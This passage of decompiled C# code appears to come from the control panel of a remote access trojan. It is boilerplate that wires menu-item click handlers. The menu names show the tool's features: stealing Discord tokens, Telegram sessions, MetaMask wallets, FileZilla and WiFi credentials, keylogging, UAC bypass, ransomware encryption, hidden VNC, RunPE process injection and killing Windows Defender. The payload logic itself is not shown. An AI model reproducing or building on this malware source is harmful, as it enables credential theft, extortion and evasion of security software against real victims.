					invokeBSODToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018C RID: 396
		// (get) Token: 0x060003BA RID: 954 RVA: 0x00022DBB File Offset: 0x00020FBB
		// (set) Token: 0x060003BB RID: 955 RVA: 0x00022DC8 File Offset: 0x00020FC8
		internal virtual ToolStripMenuItem DeleteRestoreToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DeleteRestoreToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DeleteRestoreToolStripMenuItem1_Click);
				ToolStripMenuItem deleteRestoreToolStripMenuItem = this._DeleteRestoreToolStripMenuItem1;
				if (deleteRestoreToolStripMenuItem != null)
				{
					deleteRestoreToolStripMenuItem.Click -= value2;
				}
				this._DeleteRestoreToolStripMenuItem1 = value;
				deleteRestoreToolStripMenuItem = this._DeleteRestoreToolStripMenuItem1;
				if (deleteRestoreToolStripMenuItem != null)
				{
					deleteRestoreToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018D RID: 397
		// (get) Token: 0x060003BC RID: 956 RVA: 0x00022E0B File Offset: 0x0002100B
		// (set) Token: 0x060003BD RID: 957 RVA: 0x00022E18 File Offset: 0x00021018
		internal virtual ToolStripMenuItem Net35InstallToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._Net35InstallToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Net35InstallToolStripMenuItem1_Click);
				ToolStripMenuItem net35InstallToolStripMenuItem = this._Net35InstallToolStripMenuItem1;
				if (net35InstallToolStripMenuItem != null)
				{
					net35InstallToolStripMenuItem.Click -= value2;
				}
				this._Net35InstallToolStripMenuItem1 = value;
				net35InstallToolStripMenuItem = this._Net35InstallToolStripMenuItem1;
				if (net35InstallToolStripMenuItem != null)
				{
					net35InstallToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018E RID: 398
		// (get) Token: 0x060003BE RID: 958 RVA: 0x00022E5B File Offset: 0x0002105B
		// (set) Token: 0x060003BF RID: 959 RVA: 0x00022E68 File Offset: 0x00021068
		internal virtual ToolStripMenuItem ShutdownToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ShutdownToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShutdownToolStripMenuItem_Click);
				ToolStripMenuItem shutdownToolStripMenuItem = this._ShutdownToolStripMenuItem;
				if (shutdownToolStripMenuItem != null)
				{
					shutdownToolStripMenuItem.Click -= value2;
				}
				this._ShutdownToolStripMenuItem = value;
				shutdownToolStripMenuItem = this._ShutdownToolStripMenuItem;
				if (shutdownToolStripMenuItem != null)
				{
					shutdownToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700018F RID: 399
		// (get) Token: 0x060003C0 RID: 960 RVA: 0x00022EAB File Offset: 0x000210AB
		// (set) Token: 0x060003C1 RID: 961 RVA: 0x00022EB8 File Offset: 0x000210B8
		internal virtual ToolStripMenuItem RestartToolStripMenuItem4
		{
			[CompilerGenerated]
			get
			{
				return this._RestartToolStripMenuItem4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RestartToolStripMenuItem4_Click);
				ToolStripMenuItem restartToolStripMenuItem = this._RestartToolStripMenuItem4;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click -= value2;
				}
				this._RestartToolStripMenuItem4 = value;
				restartToolStripMenuItem = this._RestartToolStripMenuItem4;
				if (restartToolStripMenuItem != null)
				{
					restartToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000190 RID: 400
		// (get) Token: 0x060003C2 RID: 962 RVA: 0x00022EFB File Offset: 0x000210FB
		// (set) Token: 0x060003C3 RID: 963 RVA: 0x00022F08 File Offset: 0x00021108
		internal virtual ToolStripMenuItem LogoffToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._LogoffToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.LogoffToolStripMenuItem_Click);
				ToolStripMenuItem logoffToolStripMenuItem = this._LogoffToolStripMenuItem;
				if (logoffToolStripMenuItem != null)
				{
					logoffToolStripMenuItem.Click -= value2;
				}
				this._LogoffToolStripMenuItem = value;
				logoffToolStripMenuItem = this._LogoffToolStripMenuItem;
				if (logoffToolStripMenuItem != null)
				{
					logoffToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000191 RID: 401
		// (get) Token: 0x060003C4 RID: 964 RVA: 0x00022F4B File Offset: 0x0002114B
		// (set) Token: 0x060003C5 RID: 965 RVA: 0x00022F58 File Offset: 0x00021158
		internal virtual ToolStripMenuItem DiscordTokenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._DiscordTokenToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DiscordTokenToolStripMenuItem_Click);
				ToolStripMenuItem discordTokenToolStripMenuItem = this._DiscordTokenToolStripMenuItem;
				if (discordTokenToolStripMenuItem != null)
				{
					discordTokenToolStripMenuItem.Click -= value2;
				}
				this._DiscordTokenToolStripMenuItem = value;
				discordTokenToolStripMenuItem = this._DiscordTokenToolStripMenuItem;
				if (discordTokenToolStripMenuItem != null)
				{
					discordTokenToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000192 RID: 402
		// (get) Token: 0x060003C6 RID: 966 RVA: 0x00022F9B File Offset: 0x0002119B
		// (set) Token: 0x060003C7 RID: 967 RVA: 0x00022FA8 File Offset: 0x000211A8
		internal virtual ToolStripMenuItem TelegramSessionToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._TelegramSessionToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.TelegramSessionToolStripMenuItem_Click_1);
				ToolStripMenuItem telegramSessionToolStripMenuItem = this._TelegramSessionToolStripMenuItem;
				if (telegramSessionToolStripMenuItem != null)
				{
					telegramSessionToolStripMenuItem.Click -= value2;
				}
				this._TelegramSessionToolStripMenuItem = value;
				telegramSessionToolStripMenuItem = this._TelegramSessionToolStripMenuItem;
				if (telegramSessionToolStripMenuItem != null)
				{
					telegramSessionToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000193 RID: 403
		// (get) Token: 0x060003C8 RID: 968 RVA: 0x00022FEB File Offset: 0x000211EB
		// (set) Token: 0x060003C9 RID: 969 RVA: 0x00022FF8 File Offset: 0x000211F8
		internal virtual ToolStripMenuItem ProductKeyToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ProductKeyToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ProductKeyToolStripMenuItem1_Click);
				ToolStripMenuItem productKeyToolStripMenuItem = this._ProductKeyToolStripMenuItem1;
				if (productKeyToolStripMenuItem != null)
				{
					productKeyToolStripMenuItem.Click -= value2;
				}
				this._ProductKeyToolStripMenuItem1 = value;
				productKeyToolStripMenuItem = this._ProductKeyToolStripMenuItem1;
				if (productKeyToolStripMenuItem != null)
				{
					productKeyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000194 RID: 404
		// (get) Token: 0x060003CA RID: 970 RVA: 0x0002303B File Offset: 0x0002123B
		// (set) Token: 0x060003CB RID: 971 RVA: 0x00023048 File Offset: 0x00021248
		internal virtual ToolStripMenuItem MetaMaskToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._MetaMaskToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MetaMaskToolStripMenuItem1_Click);
				ToolStripMenuItem metaMaskToolStripMenuItem = this._MetaMaskToolStripMenuItem1;
				if (metaMaskToolStripMenuItem != null)
				{
					metaMaskToolStripMenuItem.Click -= value2;
				}
				this._MetaMaskToolStripMenuItem1 = value;
				metaMaskToolStripMenuItem = this._MetaMaskToolStripMenuItem1;
				if (metaMaskToolStripMenuItem != null)
				{
					metaMaskToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000195 RID: 405
		// (get) Token: 0x060003CC RID: 972 RVA: 0x0002308B File Offset: 0x0002128B
		// (set) Token: 0x060003CD RID: 973 RVA: 0x00023098 File Offset: 0x00021298
		internal virtual ToolStripMenuItem FileZillaToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._FileZillaToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FileZillaToolStripMenuItem1_Click);
				ToolStripMenuItem fileZillaToolStripMenuItem = this._FileZillaToolStripMenuItem1;
				if (fileZillaToolStripMenuItem != null)
				{
					fileZillaToolStripMenuItem.Click -= value2;
				}
				this._FileZillaToolStripMenuItem1 = value;
				fileZillaToolStripMenuItem = this._FileZillaToolStripMenuItem1;
				if (fileZillaToolStripMenuItem != null)
				{
					fileZillaToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000196 RID: 406
		// (get) Token: 0x060003CE RID: 974 RVA: 0x000230DB File Offset: 0x000212DB
		// (set) Token: 0x060003CF RID: 975 RVA: 0x000230E8 File Offset: 0x000212E8
		internal virtual ToolStripMenuItem WifiKeysToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._WifiKeysToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WifiKeysToolStripMenuItem1_Click);
				ToolStripMenuItem wifiKeysToolStripMenuItem = this._WifiKeysToolStripMenuItem1;
				if (wifiKeysToolStripMenuItem != null)
				{
					wifiKeysToolStripMenuItem.Click -= value2;
				}
				this._WifiKeysToolStripMenuItem1 = value;
				wifiKeysToolStripMenuItem = this._WifiKeysToolStripMenuItem1;
				if (wifiKeysToolStripMenuItem != null)
				{
					wifiKeysToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000197 RID: 407
		// (get) Token: 0x060003D0 RID: 976 RVA: 0x0002312B File Offset: 0x0002132B
		// (set) Token: 0x060003D1 RID: 977 RVA: 0x00023135 File Offset: 0x00021335
		internal virtual ToolStripMenuItem ReportWindowToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000198 RID: 408
		// (get) Token: 0x060003D2 RID: 978 RVA: 0x0002313E File Offset: 0x0002133E
		// (set) Token: 0x060003D3 RID: 979 RVA: 0x00023148 File Offset: 0x00021348
		internal virtual ToolStripMenuItem StartToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._StartToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StartToolStripMenuItem_Click);
				ToolStripMenuItem startToolStripMenuItem = this._StartToolStripMenuItem;
				if (startToolStripMenuItem != null)
				{
					startToolStripMenuItem.Click -= value2;
				}
				this._StartToolStripMenuItem = value;
				startToolStripMenuItem = this._StartToolStripMenuItem;
				if (startToolStripMenuItem != null)
				{
					startToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000199 RID: 409
		// (get) Token: 0x060003D4 RID: 980 RVA: 0x0002318B File Offset: 0x0002138B
		// (set) Token: 0x060003D5 RID: 981 RVA: 0x00023198 File Offset: 0x00021398
		internal virtual ToolStripMenuItem StopToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._StopToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.StopToolStripMenuItem_Click);
				ToolStripMenuItem stopToolStripMenuItem = this._StopToolStripMenuItem;
				if (stopToolStripMenuItem != null)
				{
					stopToolStripMenuItem.Click -= value2;
				}
				this._StopToolStripMenuItem = value;
				stopToolStripMenuItem = this._StopToolStripMenuItem;
				if (stopToolStripMenuItem != null)
				{
					stopToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019A RID: 410
		// (get) Token: 0x060003D6 RID: 982 RVA: 0x000231DB File Offset: 0x000213DB
		// (set) Token: 0x060003D7 RID: 983 RVA: 0x000231E8 File Offset: 0x000213E8
		internal virtual ToolStripMenuItem PerformanceToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._PerformanceToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PerformanceToolStripMenuItem1_Click);
				ToolStripMenuItem performanceToolStripMenuItem = this._PerformanceToolStripMenuItem1;
				if (performanceToolStripMenuItem != null)
				{
					performanceToolStripMenuItem.Click -= value2;
				}
				this._PerformanceToolStripMenuItem1 = value;
				performanceToolStripMenuItem = this._PerformanceToolStripMenuItem1;
				if (performanceToolStripMenuItem != null)
				{
					performanceToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019B RID: 411
		// (get) Token: 0x060003D8 RID: 984 RVA: 0x0002322B File Offset: 0x0002142B
		// (set) Token: 0x060003D9 RID: 985 RVA: 0x00023238 File Offset: 0x00021438
		internal virtual ToolStripMenuItem EditHostsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._EditHostsToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditHostsToolStripMenuItem_Click);
				ToolStripMenuItem editHostsToolStripMenuItem = this._EditHostsToolStripMenuItem;
				if (editHostsToolStripMenuItem != null)
				{
					editHostsToolStripMenuItem.Click -= value2;
				}
				this._EditHostsToolStripMenuItem = value;
				editHostsToolStripMenuItem = this._EditHostsToolStripMenuItem;
				if (editHostsToolStripMenuItem != null)
				{
					editHostsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019C RID: 412
		// (get) Token: 0x060003DA RID: 986 RVA: 0x0002327B File Offset: 0x0002147B
		// (set) Token: 0x060003DB RID: 987 RVA: 0x00023285 File Offset: 0x00021485
		internal virtual ToolStripMenuItem KeyLoggerToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700019D RID: 413
		// (get) Token: 0x060003DC RID: 988 RVA: 0x0002328E File Offset: 0x0002148E
		// (set) Token: 0x060003DD RID: 989 RVA: 0x00023298 File Offset: 0x00021498
		internal virtual ToolStripMenuItem OfflineToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._OfflineToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OfflineToolStripMenuItem1_Click);
				ToolStripMenuItem offlineToolStripMenuItem = this._OfflineToolStripMenuItem1;
				if (offlineToolStripMenuItem != null)
				{
					offlineToolStripMenuItem.Click -= value2;
				}
				this._OfflineToolStripMenuItem1 = value;
				offlineToolStripMenuItem = this._OfflineToolStripMenuItem1;
				if (offlineToolStripMenuItem != null)
				{
					offlineToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019E RID: 414
		// (get) Token: 0x060003DE RID: 990 RVA: 0x000232DB File Offset: 0x000214DB
		// (set) Token: 0x060003DF RID: 991 RVA: 0x000232E8 File Offset: 0x000214E8
		internal virtual ToolStripMenuItem OnlineToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._OnlineToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OnlineToolStripMenuItem1_Click);
				ToolStripMenuItem onlineToolStripMenuItem = this._OnlineToolStripMenuItem1;
				if (onlineToolStripMenuItem != null)
				{
					onlineToolStripMenuItem.Click -= value2;
				}
				this._OnlineToolStripMenuItem1 = value;
				onlineToolStripMenuItem = this._OnlineToolStripMenuItem1;
				if (onlineToolStripMenuItem != null)
				{
					onlineToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019F RID: 415
		// (get) Token: 0x060003E0 RID: 992 RVA: 0x0002332B File Offset: 0x0002152B
		// (set) Token: 0x060003E1 RID: 993 RVA: 0x00023338 File Offset: 0x00021538
		internal virtual ToolStripMenuItem ClientChatToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ClientChatToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ClientChatToolStripMenuItem_Click);
				ToolStripMenuItem clientChatToolStripMenuItem = this._ClientChatToolStripMenuItem;
				if (clientChatToolStripMenuItem != null)
				{
					clientChatToolStripMenuItem.Click -= value2;
				}
				this._ClientChatToolStripMenuItem = value;
				clientChatToolStripMenuItem = this._ClientChatToolStripMenuItem;
				if (clientChatToolStripMenuItem != null)
				{
					clientChatToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A0 RID: 416
		// (get) Token: 0x060003E2 RID: 994 RVA: 0x0002337B File Offset: 0x0002157B
		// (set) Token: 0x060003E3 RID: 995 RVA: 0x00023388 File Offset: 0x00021588
		internal virtual ToolStripMenuItem FilesSearcherToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._FilesSearcherToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FilesSearcherToolStripMenuItem1_Click);
				ToolStripMenuItem filesSearcherToolStripMenuItem = this._FilesSearcherToolStripMenuItem1;
				if (filesSearcherToolStripMenuItem != null)
				{
					filesSearcherToolStripMenuItem.Click -= value2;
				}
				this._FilesSearcherToolStripMenuItem1 = value;
				filesSearcherToolStripMenuItem = this._FilesSearcherToolStripMenuItem1;
				if (filesSearcherToolStripMenuItem != null)
				{
					filesSearcherToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A1 RID: 417
		// (get) Token: 0x060003E4 RID: 996 RVA: 0x000233CB File Offset: 0x000215CB
		// (set) Token: 0x060003E5 RID: 997 RVA: 0x000233D8 File Offset: 0x000215D8
		internal virtual ToolStripMenuItem CommandsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CommandsToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CommandsToolStripMenuItem_Click);
				ToolStripMenuItem commandsToolStripMenuItem = this._CommandsToolStripMenuItem;
				if (commandsToolStripMenuItem != null)
				{
					commandsToolStripMenuItem.Click -= value2;
				}
				this._CommandsToolStripMenuItem = value;
				commandsToolStripMenuItem = this._CommandsToolStripMenuItem;
				if (commandsToolStripMenuItem != null)
				{
					commandsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A2 RID: 418
		// (get) Token: 0x060003E6 RID: 998 RVA: 0x0002341B File Offset: 0x0002161B
		// (set) Token: 0x060003E7 RID: 999 RVA: 0x00023428 File Offset: 0x00021628
		internal virtual ToolStripMenuItem MessageBoxToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._MessageBoxToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MessageBoxToolStripMenuItem_Click);
				ToolStripMenuItem messageBoxToolStripMenuItem = this._MessageBoxToolStripMenuItem;
				if (messageBoxToolStripMenuItem != null)
				{
					messageBoxToolStripMenuItem.Click -= value2;
				}
				this._MessageBoxToolStripMenuItem = value;
				messageBoxToolStripMenuItem = this._MessageBoxToolStripMenuItem;
				if (messageBoxToolStripMenuItem != null)
				{
					messageBoxToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A3 RID: 419
		// (get) Token: 0x060003E8 RID: 1000 RVA: 0x0002346B File Offset: 0x0002166B
		// (set) Token: 0x060003E9 RID: 1001 RVA: 0x00023475 File Offset: 0x00021675
		internal virtual ToolStripMenuItem UACBypassToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001A4 RID: 420
		// (get) Token: 0x060003EA RID: 1002 RVA: 0x0002347E File Offset: 0x0002167E
		// (set) Token: 0x060003EB RID: 1003 RVA: 0x00023488 File Offset: 0x00021688
		internal virtual ToolStripMenuItem RunAsToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._RunAsToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunAsToolStripMenuItem1_Click);
				ToolStripMenuItem runAsToolStripMenuItem = this._RunAsToolStripMenuItem1;
				if (runAsToolStripMenuItem != null)
				{
					runAsToolStripMenuItem.Click -= value2;
				}
				this._RunAsToolStripMenuItem1 = value;
				runAsToolStripMenuItem = this._RunAsToolStripMenuItem1;
				if (runAsToolStripMenuItem != null)
				{
					runAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A5 RID: 421
		// (get) Token: 0x060003EC RID: 1004 RVA: 0x000234CB File Offset: 0x000216CB
		// (set) Token: 0x060003ED RID: 1005 RVA: 0x000234D5 File Offset: 0x000216D5
		internal virtual ToolStripMenuItem RansomwareToolStripMenuItem1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170001A6 RID: 422
		// (get) Token: 0x060003EE RID: 1006 RVA: 0x000234DE File Offset: 0x000216DE
		// (set) Token: 0x060003EF RID: 1007 RVA: 0x000234E8 File Offset: 0x000216E8
		internal virtual ToolStripMenuItem EncryptToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._EncryptToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EncryptToolStripMenuItem1_Click);
				ToolStripMenuItem encryptToolStripMenuItem = this._EncryptToolStripMenuItem1;
				if (encryptToolStripMenuItem != null)
				{
					encryptToolStripMenuItem.Click -= value2;
				}
				this._EncryptToolStripMenuItem1 = value;
				encryptToolStripMenuItem = this._EncryptToolStripMenuItem1;
				if (encryptToolStripMenuItem != null)
				{
					encryptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A7 RID: 423
		// (get) Token: 0x060003F0 RID: 1008 RVA: 0x0002352B File Offset: 0x0002172B
		// (set) Token: 0x060003F1 RID: 1009 RVA: 0x00023538 File Offset: 0x00021738
		internal virtual ToolStripMenuItem DecryptToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._DecryptToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DecryptToolStripMenuItem1_Click);
				ToolStripMenuItem decryptToolStripMenuItem = this._DecryptToolStripMenuItem1;
				if (decryptToolStripMenuItem != null)
				{
					decryptToolStripMenuItem.Click -= value2;
				}
				this._DecryptToolStripMenuItem1 = value;
				decryptToolStripMenuItem = this._DecryptToolStripMenuItem1;
				if (decryptToolStripMenuItem != null)
				{
					decryptToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A8 RID: 424
		// (get) Token: 0x060003F2 RID: 1010 RVA: 0x0002357B File Offset: 0x0002177B
		// (set) Token: 0x060003F3 RID: 1011 RVA: 0x00023588 File Offset: 0x00021788
		internal virtual ToolStripMenuItem ReverseProxyToolStripMenuItem1
		{
			[CompilerGenerated]
			get
			{
				return this._ReverseProxyToolStripMenuItem1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ReverseProxyToolStripMenuItem1_Click);
				ToolStripMenuItem reverseProxyToolStripMenuItem = this._ReverseProxyToolStripMenuItem1;
				if (reverseProxyToolStripMenuItem != null)
				{
					reverseProxyToolStripMenuItem.Click -= value2;
				}
				this._ReverseProxyToolStripMenuItem1 = value;
				reverseProxyToolStripMenuItem = this._ReverseProxyToolStripMenuItem1;
				if (reverseProxyToolStripMenuItem != null)
				{
					reverseProxyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A9 RID: 425
		// (get) Token: 0x060003F4 RID: 1012 RVA: 0x000235CB File Offset: 0x000217CB
		// (set) Token: 0x060003F5 RID: 1013 RVA: 0x000235D8 File Offset: 0x000217D8
		internal virtual ToolStripMenuItem HiddenVNCToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._HiddenVNCToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenVNCToolStripMenuItem_Click);
				ToolStripMenuItem hiddenVNCToolStripMenuItem = this._HiddenVNCToolStripMenuItem;
				if (hiddenVNCToolStripMenuItem != null)
				{
					hiddenVNCToolStripMenuItem.Click -= value2;
				}
				this._HiddenVNCToolStripMenuItem = value;
				hiddenVNCToolStripMenuItem = this._HiddenVNCToolStripMenuItem;
				if (hiddenVNCToolStripMenuItem != null)
				{
					hiddenVNCToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001AA RID: 426
		// (get) Token: 0x060003F6 RID: 1014 RVA: 0x0002361B File Offset: 0x0002181B
		// (set) Token: 0x060003F7 RID: 1015 RVA: 0x00023628 File Offset: 0x00021828
		internal virtual ToolStripMenuItem RunPEToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RunPEToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RunPEToolStripMenuItem_Click);
				ToolStripMenuItem runPEToolStripMenuItem = this._RunPEToolStripMenuItem;
				if (runPEToolStripMenuItem != null)
				{
					runPEToolStripMenuItem.Click -= value2;
				}
				this._RunPEToolStripMenuItem = value;
				runPEToolStripMenuItem = this._RunPEToolStripMenuItem;
				if (runPEToolStripMenuItem != null)
				{
					runPEToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001AB RID: 427
		// (get) Token: 0x060003F8 RID: 1016 RVA: 0x0002366B File Offset: 0x0002186B
		// (set) Token: 0x060003F9 RID: 1017 RVA: 0x00023678 File Offset: 0x00021878
		internal virtual ToolStripMenuItem MemoryToolStripMenuItem2
		{
			[CompilerGenerated]
			get
			{
				return this._MemoryToolStripMenuItem2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MemoryToolStripMenuItem2_Click);
				ToolStripMenuItem memoryToolStripMenuItem = this._MemoryToolStripMenuItem2;
				if (memoryToolStripMenuItem != null)
				{
					memoryToolStripMenuItem.Click -= value2;
				}
				this._MemoryToolStripMenuItem2 = value;
				memoryToolStripMenuItem = this._MemoryToolStripMenuItem2;
				if (memoryToolStripMenuItem != null)
				{
					memoryToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001AC RID: 428
		// (get) Token: 0x060003FA RID: 1018 RVA: 0x000236BB File Offset: 0x000218BB
		// (set) Token: 0x060003FB RID: 1019 RVA: 0x000236C8 File Offset: 0x000218C8
		internal virtual ToolStripMenuItem BotkillerToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._BotkillerToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.BotkillerToolStripMenuItem_Click);
				ToolStripMenuItem botkillerToolStripMenuItem = this._BotkillerToolStripMenuItem;
				if (botkillerToolStripMenuItem != null)
				{
					botkillerToolStripMenuItem.Click -= value2;
				}
				this._BotkillerToolStripMenuItem = value;
				botkillerToolStripMenuItem = this._BotkillerToolStripMenuItem;
				if (botkillerToolStripMenuItem != null)
				{
					botkillerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001AD RID: 429
		// (get) Token: 0x060003FC RID: 1020 RVA: 0x0002370B File Offset: 0x0002190B
		// (set) Token: 0x060003FD RID: 1021 RVA: 0x00023718 File Offset: 0x00021918
		internal virtual ToolStripMenuItem WDKillerToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._WDKillerToolStripMenuItem;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WDKillerToolStripMenuItem_Click);
				ToolStripMenuItem wdkillerToolStripMenuItem = this._WDKillerToolStripMenuItem;
				if (wdkillerToolStripMenuItem != null)
				{
					wdkillerToolStripMenuItem.Click -= value2;
				}
				this._WDKillerToolStripMenuItem = value;
				wdkillerToolStripMenuItem = this._WDKillerToolStripMenuItem;
				if (wdkillerToolStripMenuItem != null)
				{
					wdkillerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001AE RID: 430
		// (get) Token: 0x060003FE RID: 1022 RVA: 0x0002375B File Offset: 0x0002195B
		// (set) Token: 0x060003FF RID: 1023 RVA: 0x00023768 File Offset: 0x00021968
